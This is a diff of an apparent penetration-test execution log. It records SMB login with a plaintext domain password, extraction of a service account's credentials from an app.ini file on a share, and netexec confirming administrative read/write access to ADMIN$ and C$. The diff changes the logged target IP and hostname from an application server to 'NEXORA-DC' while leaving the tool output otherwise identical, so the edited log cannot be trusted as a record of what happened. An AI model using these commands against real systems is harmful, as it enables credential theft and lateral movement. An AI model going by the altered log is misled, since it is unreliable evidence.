@@ -1,9 +1,9 @@
 [+] Run 1 Execution Log — Credential Exposure Validation
 Timestamp: 2026-10-18 14:10:22 UTC
-Operator: kali@10.10.10.10
-Target: 10.10.10.50 (Nexora-SRV-APP01)
+Operator: kali@192.168.23.131
+Target: 192.168.23.129 (NEXORA-DC)
 
-$ smbclient.py 'nexora.local/jsmith:Password123!'@10.10.10.50
+$ smbclient.py 'nexora.local/jsmith:Password123!'@192.168.23.129
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 smb: \> use NexoraApp
@@ -19,12 +19,12 @@ $ cat app.ini | grep -E 'User|Pass'
 User=NEXORA\svc_backup
 Pass=[REDACTED IN EVIDENCE COMMIT]
 
-$ netexec smb 10.10.10.50 -u 'svc_backup' -p '[REDACTED]' --shares
-SMB         10.10.10.50     445    SRV-APP01        [*] Windows 10.0 Build 20348 x64 (name:SRV-APP01) (domain:nexora.local)
-SMB         10.10.10.50     445    SRV-APP01        [+] nexora.local\svc_backup:***** (Pwn3d!)
-SMB         10.10.10.50     445    SRV-APP01        [+] Enumerated shares
-SMB         10.10.10.50     445    SRV-APP01        ADMIN$          READ, WRITE
-SMB         10.10.10.50     445    SRV-APP01        C$              READ, WRITE
-SMB         10.10.10.50     445    SRV-APP01        NexoraApp       READ, WRITE
-SMB         10.10.10.50     445    SRV-APP01        NETLOGON        READ
-SMB         10.10.10.50     445    SRV-APP01        SYSVOL          READ
+$ netexec smb 192.168.23.129 -u 'svc_backup' -p '[REDACTED]' --shares
+SMB         192.168.23.129     445    NEXORA-DC        [*] Windows 10.0 Build 20348 x64 (name:NEXORA-DC) (domain:nexora.local)
+SMB         192.168.23.129     445    NEXORA-DC        [+] nexora.local\svc_backup:***** (Pwn3d!)
+SMB         192.168.23.129     445    NEXORA-DC        [+] Enumerated shares
+SMB         192.168.23.129     445    NEXORA-DC        ADMIN$          READ, WRITE
+SMB         192.168.23.129     445    NEXORA-DC        C$              READ, WRITE
+SMB         192.168.23.129     445    NEXORA-DC        NexoraApp       READ, WRITE
+SMB         192.168.23.129     445    NEXORA-DC        NETLOGON        READ
+SMB         192.168.23.129     445    NEXORA-DC        SYSVOL          READ
